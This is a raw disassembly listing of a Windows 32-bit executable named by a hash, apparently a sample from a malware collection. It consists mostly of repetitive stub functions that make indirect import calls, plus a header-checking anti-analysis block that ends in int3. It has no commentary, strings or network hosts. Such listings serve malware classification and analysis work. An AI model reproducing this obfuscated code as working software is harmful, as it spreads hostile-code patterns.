
0e8e7e60294cf2153440f71e11a12437079511220ae5a53341d93e534256a533.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    edi,edi
  401002:	push   ebp
  401003:	mov    ebp,esp
  401005:	sub    esp,0x5c
  401008:	push   edx
  401009:	push   ebx
  40100a:	push   edi
  40100b:	push   ebx
  40100c:	push   ecx
  40100d:	call   0x401998
  401012:	add    esp,0x10
  401015:	pop    edx
  401016:	push   edx
  401017:	push   0x403030
  40101c:	pop    eax
  40101d:	call   DWORD PTR cs:[eax]
  401020:	pop    edx
  401021:	push   edx
  401022:	mov    edx,0x0
  401027:	push   edx
  401028:	push   0x40306c
  40102d:	pop    eax
  40102e:	call   DWORD PTR cs:[eax]
  401031:	pop    edx
  401032:	sub    esp,0xffffffa4
  401035:	mov    ebp,DWORD PTR [esp]
  401038:	add    esp,0x4
  40103b:	ret    
  40103c:	mov    edi,edi
  40103e:	push   ebp
  40103f:	mov    ebp,esp
  401041:	sub    esp,0x24
  401044:	push   edx
  401045:	push   DWORD PTR [edx+0x2cc]
  40104b:	push   DWORD PTR [edx+0x30c]
  401051:	push   edi
  401052:	push   DWORD PTR [edx+0x120]
  401058:	call   0x4013c4
  40105d:	add    esp,0x10
  401060:	pop    edx
  401061:	push   edx
  401062:	push   0x403030
  401067:	pop    eax
  401068:	call   DWORD PTR cs:[eax]
  40106b:	pop    edx
  40106c:	push   edx
  40106d:	mov    eax,0x0
  401072:	push   eax
  401073:	push   0x403044
  401078:	pop    eax
  401079:	call   DWORD PTR cs:[eax]
  40107c:	pop    edx
  40107d:	sub    esp,0xffffffdc
  401080:	mov    ebp,DWORD PTR [esp]
  401083:	add    esp,0x4
  401086:	ret    
  401087:	add    BYTE PTR [edi],cl
  401089:	or     BYTE PTR [edx+0x0],0x0
  40108d:	add    BYTE PTR [eax],al
  40108f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401095:	sub    esp,0x54
  401098:	push   edx
  401099:	push   DWORD PTR [edx+0x530]
  40109f:	push   DWORD PTR [edx+0x5f0]
  4010a5:	push   esi
  4010a6:	call   0x4014f4
  4010ab:	add    esp,0xc
  4010ae:	pop    edx
  4010af:	push   edx
  4010b0:	mov    edx,0x0
  4010b5:	push   edx
  4010b6:	push   0x40306c
  4010bb:	pop    eax
  4010bc:	call   DWORD PTR cs:[eax]
  4010bf:	pop    edx
  4010c0:	push   edx
  4010c1:	push   0x0
  4010c3:	push   0x403014
  4010c8:	pop    eax
  4010c9:	call   DWORD PTR cs:[eax]
  4010cc:	pop    edx
  4010cd:	sub    esp,0xffffffac
  4010d0:	mov    ebp,DWORD PTR [esp]
  4010d3:	add    esp,0x4
  4010d6:	ret    
  4010d7:	add    BYTE PTR [ebx-0x74aa9f01],cl
  4010dd:	in     al,dx
  4010de:	sub    esp,0x5c
  4010e1:	push   edx
  4010e2:	mov    ecx,0x0
  4010e7:	push   ecx
  4010e8:	push   0x403004
  4010ed:	pop    eax
  4010ee:	call   DWORD PTR cs:[eax]
  4010f1:	pop    edx
  4010f2:	test   eax,eax
  4010f4:	je     0x4010f7
  4010f6:	ret    
  4010f7:	push   edx
  4010f8:	mov    edi,0x0
  4010fd:	push   edi
  4010fe:	push   0x403004
  401103:	pop    eax
  401104:	call   DWORD PTR cs:[eax]
  401107:	pop    edx
  401108:	push   edx
  401109:	push   esi
  40110a:	push   DWORD PTR [edx+0xc8]
  401110:	push   DWORD PTR [edx+0x5f4]
  401116:	call   0x401af8
  40111b:	add    esp,0xc
  40111e:	pop    edx
  40111f:	mov    eax,0x403048
  401124:	mov    eax,DWORD PTR [eax]
  401126:	push   eax
  401127:	push   DWORD PTR [edx+0x130]
  40112d:	pop    edi
  40112e:	call   edi
  401130:	sub    esp,0xffffffa4
  401133:	mov    ebp,DWORD PTR [esp]
  401136:	add    esp,0x4
  401139:	ret    
  40113a:	add    BYTE PTR [eax],al
  40113c:	add    BYTE PTR [eax],al
  40113e:	add    BYTE PTR [eax],al
  401140:	mov    edi,edi
  401142:	push   ebp
  401143:	mov    ebp,esp
  401145:	sub    esp,0x5c
  401148:	push   edx
  401149:	push   DWORD PTR [edx+0x13c]
  40114f:	push   DWORD PTR [edx+0x3fc]
  401155:	push   DWORD PTR [edx+0x23c]
  40115b:	call   0x401300
  401160:	add    esp,0xc
  401163:	pop    edx
  401164:	push   edx
  401165:	mov    edx,0x0
  40116a:	push   edx
  40116b:	push   0x403060
  401170:	pop    eax
  401171:	call   DWORD PTR cs:[eax]
  401174:	pop    edx
  401175:	push   edx
  401176:	mov    edx,0x0
  40117b:	push   edx
  40117c:	push   0x403020
  401181:	pop    eax
  401182:	call   DWORD PTR cs:[eax]
  401185:	pop    edx
  401186:	sub    esp,0xffffffa4
  401189:	mov    ebp,DWORD PTR [esp]
  40118c:	add    esp,0x4
  40118f:	ret    
  401190:	add    BYTE PTR [eax],al
  401192:	add    BYTE PTR [eax],al
  401194:	mov    edi,edi
  401196:	push   ebp
  401197:	mov    ebp,esp
  401199:	sub    esp,0x28
  40119c:	push   edx
  40119d:	push   esi
  40119e:	push   DWORD PTR [edx+0x140]
  4011a4:	push   DWORD PTR [edx+0x28]
  4011a7:	call   0x401344
  4011ac:	add    esp,0xc
  4011af:	pop    edx
  4011b0:	push   edx
  4011b1:	push   0x0
  4011b3:	push   0x403034
  4011b8:	pop    eax
  4011b9:	call   DWORD PTR cs:[eax]
  4011bc:	pop    edx
  4011bd:	push   edx
  4011be:	mov    esi,0x0
  4011c3:	push   esi
  4011c4:	push   0x403024
  4011c9:	pop    eax
  4011ca:	call   DWORD PTR cs:[eax]
  4011cd:	pop    edx
  4011ce:	sub    esp,0xffffffd8
  4011d1:	mov    ebp,DWORD PTR [esp]
  4011d4:	add    esp,0x4
  4011d7:	ret    
  4011d8:	add    BYTE PTR [eax],al
  4011da:	add    BYTE PTR [eax],al
  4011dc:	mov    edi,edi
  4011de:	push   ebp
  4011df:	mov    ebp,esp
  4011e1:	sub    esp,0x34
  4011e4:	push   edx
  4011e5:	push   0x40302c
  4011ea:	pop    eax
  4011eb:	call   DWORD PTR cs:[eax]
  4011ee:	pop    edx
  4011ef:	push   edx
  4011f0:	push   DWORD PTR [edx+0x104]
  4011f6:	push   DWORD PTR [edx+0x5ac]
  4011fc:	push   DWORD PTR [edx+0x204]
  401202:	call   0x4019e0
  401207:	add    esp,0xc
  40120a:	pop    edx
  40120b:	push   edx
  40120c:	mov    ecx,0x0
  401211:	push   ecx
  401212:	push   0x403060
  401217:	pop    eax
  401218:	call   DWORD PTR cs:[eax]
  40121b:	pop    edx
  40121c:	sub    esp,0xffffffcc
  40121f:	mov    ebp,DWORD PTR [esp]
  401222:	add    esp,0x4
  401225:	ret    
	...
  40123e:	add    BYTE PTR [eax],al
  401240:	mov    edi,edi
  401242:	push   ebp
  401243:	mov    ebp,esp
  401245:	sub    esp,0x3c
  401248:	push   edx
  401249:	push   ebx
  40124a:	push   ecx
  40124b:	call   0x4016c0
  401250:	add    esp,0x8
  401253:	pop    edx
  401254:	push   edx
  401255:	push   0x0
  401257:	push   0x403010
  40125c:	pop    eax
  40125d:	call   DWORD PTR cs:[eax]
  401260:	pop    edx
  401261:	push   edx
  401262:	mov    edi,0x0
  401267:	push   edi
  401268:	push   0x403004
  40126d:	pop    eax
  40126e:	call   DWORD PTR cs:[eax]
  401271:	pop    edx
  401272:	sub    esp,0xffffffc4
  401275:	mov    ebp,DWORD PTR [esp]
  401278:	add    esp,0x4
  40127b:	ret    
  40127c:	mov    edi,edi
  40127e:	push   ebp
  40127f:	mov    ebp,esp
  401281:	sub    esp,0x54
  401284:	push   edx
  401285:	push   ebx
  401286:	push   ebx
  401287:	call   0x401000
  40128c:	add    esp,0x8
  40128f:	pop    edx
  401290:	push   edx
  401291:	push   0x0
  401293:	push   0x40303c
  401298:	pop    eax
  401299:	call   DWORD PTR cs:[eax]
  40129c:	pop    edx
  40129d:	push   edx
  40129e:	mov    eax,0x0
  4012a3:	push   eax
  4012a4:	push   0x403038
  4012a9:	pop    eax
  4012aa:	call   DWORD PTR cs:[eax]
  4012ad:	pop    edx
  4012ae:	sub    esp,0xffffffac
  4012b1:	mov    ebp,DWORD PTR [esp]
  4012b4:	add    esp,0x4
  4012b7:	ret    
  4012b8:	add    BYTE PTR [eax],al
  4012ba:	add    BYTE PTR [eax],al
  4012bc:	mov    edi,edi
  4012be:	push   ebp
  4012bf:	mov    ebp,esp
  4012c1:	sub    esp,0x28
  4012c4:	push   edx
  4012c5:	push   ecx
  4012c6:	push   DWORD PTR [edx+0x270]
  4012cc:	push   eax
  4012cd:	call   0x401e80
  4012d2:	add    esp,0xc
  4012d5:	pop    edx
  4012d6:	push   edx
  4012d7:	lea    edi,[edx]
  4012d9:	push   edi
  4012da:	push   0x403048
  4012df:	pop    eax
  4012e0:	call   DWORD PTR cs:[eax]
  4012e3:	test   eax,eax
  4012e5:	jne    0x4012d7
  4012e7:	pop    edx
  4012e8:	push   edx
  4012e9:	push   0x0
  4012eb:	push   0x40303c
  4012f0:	pop    eax
  4012f1:	call   DWORD PTR cs:[eax]
  4012f4:	pop    edx
  4012f5:	sub    esp,0xffffffd8
  4012f8:	mov    ebp,DWORD PTR [esp]
  4012fb:	add    esp,0x4
  4012fe:	ret    
  4012ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  401305:	sub    esp,0x20
  401308:	push   edx
  401309:	mov    ebx,0x0
  40130e:	push   ebx
  40130f:	push   0x403010
  401314:	pop    eax
  401315:	call   DWORD PTR cs:[eax]
  401318:	pop    edx
  401319:	push   edx
  40131a:	push   eax
  40131b:	push   esi
  40131c:	push   eax
  40131d:	push   edi
  40131e:	call   0x401a24
  401323:	add    esp,0x10
  401326:	pop    edx
  401327:	push   edx
  401328:	lea    eax,[edx]
  40132a:	push   eax
  40132b:	push   0x403048
  401330:	pop    eax
  401331:	call   DWORD PTR cs:[eax]
  401334:	test   eax,eax
  401336:	jne    0x401328
  401338:	pop    edx
  401339:	sub    esp,0xffffffe0
  40133c:	mov    ebp,DWORD PTR [esp]
  40133f:	add    esp,0x4
  401342:	ret    
  401343:	add    BYTE PTR [ebx-0x1374aa01],cl
  401349:	sub    esp,0x3c
  40134c:	push   edx
  40134d:	push   DWORD PTR [edx+0x150]
  401353:	push   ecx
  401354:	push   ebx
  401355:	push   ebx
  401356:	call   0x4015e0
  40135b:	add    esp,0x10
  40135e:	pop    edx
  40135f:	push   edx
  401360:	mov    esi,0x0
  401365:	push   esi
  401366:	push   0x403044
  40136b:	pop    eax
  40136c:	call   DWORD PTR cs:[eax]
  40136f:	pop    edx
  401370:	push   edx
  401371:	push   0x0
  401373:	push   0x403060
  401378:	pop    eax
  401379:	call   DWORD PTR cs:[eax]
  40137c:	pop    edx
  40137d:	sub    esp,0xffffffc4
  401380:	mov    ebp,DWORD PTR [esp]
  401383:	add    esp,0x4
  401386:	ret    
  401387:	add    BYTE PTR [ebx-0x1374aa01],cl
  40138d:	sub    esp,0x4c
  401390:	push   edx
  401391:	push   0x0
  401393:	push   0x403014
  401398:	pop    eax
  401399:	call   DWORD PTR cs:[eax]
  40139c:	pop    edx
  40139d:	push   edx
  40139e:	push   edi
  40139f:	push   edi
  4013a0:	push   ecx
  4013a1:	call   0x401090
  4013a6:	add    esp,0xc
  4013a9:	pop    edx
  4013aa:	push   edx
  4013ab:	push   0x0
  4013ad:	push   0x403044
  4013b2:	pop    eax
  4013b3:	call   DWORD PTR cs:[eax]
  4013b6:	pop    edx
  4013b7:	sub    esp,0xffffffb4
  4013ba:	mov    ebp,DWORD PTR [esp]
  4013bd:	add    esp,0x4
  4013c0:	ret    
  4013c1:	add    BYTE PTR [eax],al
  4013c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4013c9:	sub    esp,0x30
  4013cc:	push   edx
  4013cd:	lea    eax,[edx]
  4013cf:	push   eax
  4013d0:	push   0x403048
  4013d5:	pop    eax
  4013d6:	call   DWORD PTR cs:[eax]
  4013d9:	test   eax,eax
  4013db:	jne    0x4013cd
  4013dd:	pop    edx
  4013de:	push   edx
  4013df:	push   eax
  4013e0:	push   eax
  4013e1:	push   ecx
  4013e2:	push   ebx
  4013e3:	call   0x40190c
  4013e8:	add    esp,0x10
  4013eb:	pop    edx
  4013ec:	push   edx
  4013ed:	lea    ebx,[edx]
  4013ef:	push   ebx
  4013f0:	push   0x403048
  4013f5:	pop    eax
  4013f6:	call   DWORD PTR cs:[eax]
  4013f9:	test   eax,eax
  4013fb:	jne    0x4013ed
  4013fd:	pop    edx
  4013fe:	sub    esp,0xffffffd0
  401401:	mov    ebp,DWORD PTR [esp]
  401404:	add    esp,0x4
  401407:	ret    
  401408:	add    BYTE PTR [eax],al
  40140a:	add    BYTE PTR [eax],al
  40140c:	mov    edi,edi
  40140e:	push   ebp
  40140f:	mov    ebp,esp
  401411:	sub    esp,0x5c
  401414:	push   edx
  401415:	mov    ebx,0x0
  40141a:	push   ebx
  40141b:	push   0x403044
  401420:	pop    eax
  401421:	call   DWORD PTR cs:[eax]
  401424:	pop    edx
  401425:	push   edx
  401426:	push   DWORD PTR [edx+0xb0]
  40142c:	push   eax
  40142d:	push   DWORD PTR [edx+0x1dc]
  401433:	push   DWORD PTR [edx+0x310]
  401439:	call   0x401bd0
  40143e:	add    esp,0x10
  401441:	pop    edx
  401442:	push   edx
  401443:	push   0x0
  401445:	push   0x403044
  40144a:	pop    eax
  40144b:	call   DWORD PTR cs:[eax]
  40144e:	pop    edx
  40144f:	sub    esp,0xffffffa4
  401452:	mov    ebp,DWORD PTR [esp]
  401455:	add    esp,0x4
  401458:	ret    
	...
  401461:	add    BYTE PTR [eax],al
  401463:	add    BYTE PTR [ebx-0x1374aa01],cl
  401469:	sub    esp,0x40
  40146c:	push   edx
  40146d:	mov    ebx,0x0
  401472:	push   ebx
  401473:	push   0x403024
  401478:	pop    eax
  401479:	call   DWORD PTR cs:[eax]
  40147c:	pop    edx
  40147d:	push   edx
  40147e:	push   DWORD PTR [edx+0xcc]
  401484:	push   eax
  401485:	push   DWORD PTR [edx+0x254]
  40148b:	call   0x401a68
  401490:	add    esp,0xc
  401493:	pop    edx
  401494:	push   edx
  401495:	mov    esi,0x0
  40149a:	push   esi
  40149b:	push   0x403034
  4014a0:	pop    eax
  4014a1:	call   DWORD PTR cs:[eax]
  4014a4:	pop    edx
  4014a5:	sub    esp,0xffffffc0
  4014a8:	mov    ebp,DWORD PTR [esp]
  4014ab:	add    esp,0x4
  4014ae:	ret    
  4014af:	add    BYTE PTR [ebx],ch
  4014b1:	rol    BYTE PTR [ecx+0x47f000c2],cl
  4014b7:	add    BYTE PTR [edx+0x33],dl
  4014ba:	leave  
  4014bb:	or     ecx,0x403090
  4014c1:	and    WORD PTR [ecx],0x0
  4014c5:	push   DWORD PTR [ecx]
  4014c7:	pop    eax
  4014c8:	mov    edx,eax
  4014ca:	push   0x3c
  4014cc:	add    DWORD PTR [esp],eax
  4014cf:	pop    ecx
  4014d0:	push   eax
  4014d1:	mov    edi,esp
  4014d3:	mov    esi,ecx
  4014d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014d6:	pop    eax
  4014d7:	mov    edx,DWORD PTR [eax+edx*1+0x1c]
  4014db:	ror    edx,0x8
  4014de:	xor    eax,eax
  4014e0:	or     al,0x80
  4014e2:	cmp    al,dl
  4014e4:	pop    edx
  4014e5:	ja     0x4014f0
  4014e7:	nop
  4014e8:	nop
  4014e9:	nop
  4014ea:	nop
  4014eb:	jmp    0x401088
  4014f0:	xor    esp,esp
  4014f2:	int    0x3
  4014f4:	mov    edi,edi
  4014f6:	push   ebp
  4014f7:	mov    ebp,esp
  4014f9:	sub    esp,0x40
  4014fc:	push   edx
  4014fd:	push   esi
  4014fe:	push   edi
  4014ff:	push   ecx
  401500:	push   DWORD PTR [edx+0xf4]
  401506:	call   0x4017e4
  40150b:	add    esp,0x10
  40150e:	pop    edx
  40150f:	push   edx
  401510:	push   0x0
  401512:	push   0x40303c
  401517:	pop    eax
  401518:	call   DWORD PTR cs:[eax]
  40151b:	pop    edx
  40151c:	push   edx
  40151d:	mov    eax,0x0
  401522:	push   eax
  401523:	push   0x40306c
  401528:	pop    eax
  401529:	call   DWORD PTR cs:[eax]
  40152c:	pop    edx
  40152d:	sub    esp,0xffffffc0
  401530:	mov    ebp,DWORD PTR [esp]
  401533:	add    esp,0x4
  401536:	ret    
	...
  401543:	add    BYTE PTR [ebx-0x1374aa01],cl
  401549:	sub    esp,0x58
  40154c:	push   edx
  40154d:	push   0x0
  40154f:	push   0x40306c
  401554:	pop    eax
  401555:	call   DWORD PTR cs:[eax]
  401558:	pop    edx
  401559:	push   edx
  40155a:	push   DWORD PTR [edx+0x388]
  401560:	push   DWORD PTR [edx+0x478]
  401566:	push   DWORD PTR [edx+0x24c]
  40156c:	push   DWORD PTR [edx+0x390]
  401572:	call   0x40103c
  401577:	add    esp,0x10
  40157a:	pop    edx
  40157b:	push   edx
  40157c:	mov    edi,0x0
  401581:	push   edi
  401582:	push   0x403024
  401587:	pop    eax
  401588:	call   DWORD PTR cs:[eax]
  40158b:	pop    edx
  40158c:	sub    esp,0xffffffa8
  40158f:	mov    ebp,DWORD PTR [esp]
  401592:	add    esp,0x4
  401595:	ret    
  401596:	add    BYTE PTR [eax],al
  401598:	mov    edi,edi
  40159a:	push   ebp
  40159b:	mov    ebp,esp
  40159d:	sub    esp,0x1c
  4015a0:	push   edx
  4015a1:	push   ecx
  4015a2:	push   DWORD PTR [edx+0x518]
  4015a8:	push   ecx
  4015a9:	call   0x401cc4
  4015ae:	add    esp,0xc
  4015b1:	pop    edx
  4015b2:	push   edx
  4015b3:	lea    edx,[edx]
  4015b5:	push   edx
  4015b6:	push   0x403048
  4015bb:	pop    eax
  4015bc:	call   DWORD PTR cs:[eax]
  4015bf:	test   eax,eax
  4015c1:	jne    0x4015b3
  4015c3:	pop    edx
  4015c4:	push   edx
  4015c5:	push   0x0
  4015c7:	push   0x403044
  4015cc:	pop    eax
  4015cd:	call   DWORD PTR cs:[eax]
  4015d0:	pop    edx
  4015d1:	sub    esp,0xffffffe4
  4015d4:	mov    ebp,DWORD PTR [esp]
  4015d7:	add    esp,0x4
  4015da:	ret    
  4015db:	add    BYTE PTR [eax],al
  4015dd:	add    BYTE PTR [eax],al
  4015df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4015e5:	sub    esp,0x1c
  4015e8:	push   edx
  4015e9:	push   DWORD PTR [edx+0x3b0]
  4015ef:	push   DWORD PTR [edx+0x334]
  4015f5:	push   ecx
  4015f6:	call   0x401c10
  4015fb:	add    esp,0xc
  4015fe:	pop    edx
  4015ff:	push   edx
  401600:	mov    edx,0x0
  401605:	push   edx
  401606:	push   0x40303c
  40160b:	pop    eax
  40160c:	call   DWORD PTR cs:[eax]
  40160f:	pop    edx
  401610:	push   edx
  401611:	lea    ecx,[edx]
  401613:	push   ecx
  401614:	push   0x403048
  401619:	pop    eax
  40161a:	call   DWORD PTR cs:[eax]
  40161d:	test   eax,eax
  40161f:	jne    0x401611
  401621:	pop    edx
  401622:	sub    esp,0xffffffe4
  401625:	mov    ebp,DWORD PTR [esp]
  401628:	add    esp,0x4
  40162b:	ret    
  40162c:	add    BYTE PTR [eax],al
  40162e:	add    BYTE PTR [eax],al
  401630:	mov    edi,edi
  401632:	push   ebp
  401633:	mov    ebp,esp
  401635:	sub    esp,0x28
  401638:	push   edx
  401639:	push   DWORD PTR [edx+0x27c]
  40163f:	push   DWORD PTR [edx+0x3a0]
  401645:	call   0x4012bc
  40164a:	add    esp,0x8
  40164d:	pop    edx
  40164e:	push   edx
  40164f:	push   0x0
  401651:	push   0x403020
  401656:	pop    eax
  401657:	call   DWORD PTR cs:[eax]
  40165a:	pop    edx
  40165b:	push   edx
  40165c:	mov    eax,0x0
  401661:	push   eax
  401662:	push   0x403034
  401667:	pop    eax
  401668:	call   DWORD PTR cs:[eax]
  40166b:	pop    edx
  40166c:	sub    esp,0xffffffd8
  40166f:	mov    ebp,DWORD PTR [esp]
  401672:	add    esp,0x4
  401675:	ret    
  401676:	add    BYTE PTR [eax],al
  401678:	add    BYTE PTR [eax],al
  40167a:	add    BYTE PTR [eax],al
  40167c:	mov    edi,edi
  40167e:	push   ebp
  40167f:	mov    ebp,esp
  401681:	sub    esp,0x48
  401684:	push   edx
  401685:	push   0x0
  401687:	push   0x403044
  40168c:	pop    eax
  40168d:	call   DWORD PTR cs:[eax]
  401690:	pop    edx
  401691:	push   edx
  401692:	push   DWORD PTR [edx+0x278]
  401698:	push   DWORD PTR [edx+0x1d8]
  40169e:	call   0x401ab0
  4016a3:	add    esp,0x8
  4016a6:	pop    edx
  4016a7:	push   edx
  4016a8:	push   0x0
  4016aa:	push   0x403004
  4016af:	pop    eax
  4016b0:	call   DWORD PTR cs:[eax]
  4016b3:	pop    edx
  4016b4:	sub    esp,0xffffffb8
  4016b7:	mov    ebp,DWORD PTR [esp]
  4016ba:	add    esp,0x4
  4016bd:	ret    
  4016be:	add    BYTE PTR [eax],al
  4016c0:	mov    edi,edi
  4016c2:	push   ebp
  4016c3:	mov    ebp,esp
  4016c5:	sub    esp,0x48
  4016c8:	push   edx
  4016c9:	push   DWORD PTR [edx]
  4016cb:	push   DWORD PTR [edx+0x130]
  4016d1:	push   DWORD PTR [edx+0x100]
  4016d7:	push   ecx
  4016d8:	call   0x401d00
  4016dd:	add    esp,0x10
  4016e0:	pop    edx
  4016e1:	push   edx
  4016e2:	mov    ebx,0x0
  4016e7:	push   ebx
  4016e8:	push   0x403004
  4016ed:	pop    eax
  4016ee:	call   DWORD PTR cs:[eax]
  4016f1:	pop    edx
  4016f2:	push   edx
  4016f3:	lea    ebx,[edx]
  4016f5:	push   ebx
  4016f6:	push   0x403048
  4016fb:	pop    eax
  4016fc:	call   DWORD PTR cs:[eax]
  4016ff:	test   eax,eax
  401701:	jne    0x4016f3
  401703:	pop    edx
  401704:	sub    esp,0xffffffb8
  401707:	mov    ebp,DWORD PTR [esp]
  40170a:	add    esp,0x4
  40170d:	ret    
  40170e:	add    BYTE PTR [eax],al
  401710:	mov    edi,edi
  401712:	push   ebp
  401713:	mov    ebp,esp
  401715:	sub    esp,0x3c
  401718:	push   edx
  401719:	push   0x0
  40171b:	push   0x403004
  401720:	pop    eax
  401721:	call   DWORD PTR cs:[eax]
  401724:	pop    edx
  401725:	push   edx
  401726:	push   DWORD PTR [edx+0x39c]
  40172c:	push   ecx
  40172d:	push   DWORD PTR [edx+0x4d4]
  401733:	call   0x401d98
  401738:	add    esp,0xc
  40173b:	pop    edx
  40173c:	push   edx
  40173d:	push   0x0
  40173f:	push   0x403034
  401744:	pop    eax
  401745:	call   DWORD PTR cs:[eax]
  401748:	pop    edx
  401749:	sub    esp,0xffffffc4
  40174c:	mov    ebp,DWORD PTR [esp]
  40174f:	add    esp,0x4
  401752:	ret    
  401753:	add    BYTE PTR [ebx-0x1374aa01],cl
  401759:	sub    esp,0x60
  40175c:	push   edx
  40175d:	push   ecx
  40175e:	push   DWORD PTR [edx+0xb0]
  401764:	call   0x401194
  401769:	add    esp,0x8
  40176c:	pop    edx
  40176d:	push   edx
  40176e:	lea    esi,[edx]
  401770:	push   esi
  401771:	push   0x403048
  401776:	pop    eax
  401777:	call   DWORD PTR cs:[eax]
  40177a:	test   eax,eax
  40177c:	jne    0x40176e
  40177e:	pop    edx
  40177f:	push   edx
  401780:	mov    edi,0x0
  401785:	push   edi
  401786:	push   0x403034
  40178b:	pop    eax
  40178c:	call   DWORD PTR cs:[eax]
  40178f:	pop    edx
  401790:	sub    esp,0xffffffa0
  401793:	mov    ebp,DWORD PTR [esp]
  401796:	add    esp,0x4
  401799:	ret    
  40179a:	add    BYTE PTR [eax],al
  40179c:	mov    edi,edi
  40179e:	push   ebp
  40179f:	mov    ebp,esp
  4017a1:	sub    esp,0x28
  4017a4:	push   edx
  4017a5:	push   0x0
  4017a7:	push   0x403034
  4017ac:	pop    eax
  4017ad:	call   DWORD PTR cs:[eax]
  4017b0:	pop    edx
  4017b1:	push   edx
  4017b2:	push   eax
  4017b3:	push   ebx
  4017b4:	push   edi
  4017b5:	push   DWORD PTR [edx+0x454]
  4017bb:	call   0x401de4
  4017c0:	add    esp,0x10
  4017c3:	pop    edx
  4017c4:	push   edx
  4017c5:	push   0x0
  4017c7:	push   0x403010
  4017cc:	pop    eax
  4017cd:	call   DWORD PTR cs:[eax]
  4017d0:	pop    edx
  4017d1:	sub    esp,0xffffffd8
  4017d4:	mov    ebp,DWORD PTR [esp]
  4017d7:	add    esp,0x4
  4017da:	ret    
	...
  4017e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4017e9:	sub    esp,0x40
  4017ec:	push   edx
  4017ed:	push   DWORD PTR [edx+0x2e4]
  4017f3:	push   DWORD PTR [edx+0x454]
  4017f9:	push   ebx
  4017fa:	push   DWORD PTR [edx+0x74]
  4017fd:	call   0x401598
  401802:	add    esp,0x10
  401805:	pop    edx
  401806:	push   edx
  401807:	push   0x0
  401809:	push   0x40307c
  40180e:	pop    eax
  40180f:	call   DWORD PTR cs:[eax]
  401812:	pop    edx
  401813:	push   edx
  401814:	mov    eax,0x0
  401819:	push   eax
  40181a:	push   0x40306c
  40181f:	pop    eax
  401820:	call   DWORD PTR cs:[eax]
  401823:	pop    edx
  401824:	sub    esp,0xffffffc0
  401827:	mov    ebp,DWORD PTR [esp]
  40182a:	add    esp,0x4
  40182d:	ret    
  40182e:	add    BYTE PTR [eax],al
  401830:	mov    edi,edi
  401832:	push   ebp
  401833:	mov    ebp,esp
  401835:	sub    esp,0x50
  401838:	push   edx
  401839:	push   edi
  40183a:	push   DWORD PTR [edx+0x354]
  401840:	push   ecx
  401841:	call   0x401240
  401846:	add    esp,0xc
  401849:	pop    edx
  40184a:	push   edx
  40184b:	push   0x403030
  401850:	pop    eax
  401851:	call   DWORD PTR cs:[eax]
  401854:	pop    edx
  401855:	push   edx
  401856:	mov    ebx,0x0
  40185b:	push   ebx
  40185c:	push   0x403014
  401861:	pop    eax
  401862:	call   DWORD PTR cs:[eax]
  401865:	pop    edx
  401866:	sub    esp,0xffffffb0
  401869:	mov    ebp,DWORD PTR [esp]
  40186c:	add    esp,0x4
  40186f:	ret    
  401870:	mov    edi,edi
  401872:	push   ebp
  401873:	mov    ebp,esp
  401875:	sub    esp,0x54
  401878:	push   edx
  401879:	mov    esi,0x0
  40187e:	push   esi
  40187f:	push   0x403010
  401884:	pop    eax
  401885:	call   DWORD PTR cs:[eax]
  401888:	pop    edx
  401889:	push   edx
  40188a:	push   DWORD PTR [edx+0x444]
  401890:	push   DWORD PTR [edx+0x2a8]
  401896:	push   ecx
  401897:	push   DWORD PTR [edx+0x48]
  40189a:	call   0x401630
  40189f:	add    esp,0x10
  4018a2:	pop    edx
  4018a3:	push   edx
  4018a4:	push   0x0
  4018a6:	push   0x403034
  4018ab:	pop    eax
  4018ac:	call   DWORD PTR cs:[eax]
  4018af:	pop    edx
  4018b0:	sub    esp,0xffffffac
  4018b3:	mov    ebp,DWORD PTR [esp]
  4018b6:	add    esp,0x4
  4018b9:	ret    
  4018ba:	add    BYTE PTR [eax],al
  4018bc:	mov    edi,edi
  4018be:	push   ebp
  4018bf:	mov    ebp,esp
  4018c1:	sub    esp,0x20
  4018c4:	push   edx
  4018c5:	push   ecx
  4018c6:	push   DWORD PTR [edx+0x2a8]
  4018cc:	push   DWORD PTR [edx]
  4018ce:	push   DWORD PTR [edx+0x540]
  4018d4:	call   0x401754
  4018d9:	add    esp,0x10
  4018dc:	pop    edx
  4018dd:	push   edx
  4018de:	mov    edx,0x0
  4018e3:	push   edx
  4018e4:	push   0x403034
  4018e9:	pop    eax
  4018ea:	call   DWORD PTR cs:[eax]
  4018ed:	pop    edx
  4018ee:	push   edx
  4018ef:	mov    eax,0x0
  4018f4:	push   eax
  4018f5:	push   0x40306c
  4018fa:	pop    eax
  4018fb:	call   DWORD PTR cs:[eax]
  4018fe:	pop    edx
  4018ff:	sub    esp,0xffffffe0
  401902:	mov    ebp,DWORD PTR [esp]
  401905:	add    esp,0x4
  401908:	ret    
  401909:	add    BYTE PTR [eax],al
  40190b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401911:	sub    esp,0x4c
  401914:	push   edx
  401915:	push   0x0
  401917:	push   0x403034
  40191c:	pop    eax
  40191d:	call   DWORD PTR cs:[eax]
  401920:	pop    edx
  401921:	push   edx
  401922:	push   DWORD PTR [edx+0x40]
  401925:	push   DWORD PTR [edx+0x410]
  40192b:	push   ebx
  40192c:	call   0x401d48
  401931:	add    esp,0xc
  401934:	pop    edx
  401935:	push   edx
  401936:	push   0x0
  401938:	push   0x403020
  40193d:	pop    eax
  40193e:	call   DWORD PTR cs:[eax]
  401941:	pop    edx
  401942:	sub    esp,0xffffffb4
  401945:	mov    ebp,DWORD PTR [esp]
  401948:	add    esp,0x4
  40194b:	ret    
	...
  401954:	mov    edi,edi
  401956:	push   ebp
  401957:	mov    ebp,esp
  401959:	sub    esp,0x50
  40195c:	push   edx
  40195d:	push   edi
  40195e:	push   DWORD PTR [edx+0x158]
  401964:	push   eax
  401965:	push   eax
  401966:	call   0x40179c
  40196b:	add    esp,0x10
  40196e:	pop    edx
  40196f:	push   edx
  401970:	mov    eax,0x0
  401975:	push   eax
  401976:	push   0x40307c
  40197b:	pop    eax
  40197c:	call   DWORD PTR cs:[eax]
  40197f:	pop    edx
  401980:	push   edx
  401981:	push   0x0
  401983:	push   0x403014
  401988:	pop    eax
  401989:	call   DWORD PTR cs:[eax]
  40198c:	pop    edx
  40198d:	sub    esp,0xffffffb0
  401990:	mov    ebp,DWORD PTR [esp]
  401993:	add    esp,0x4
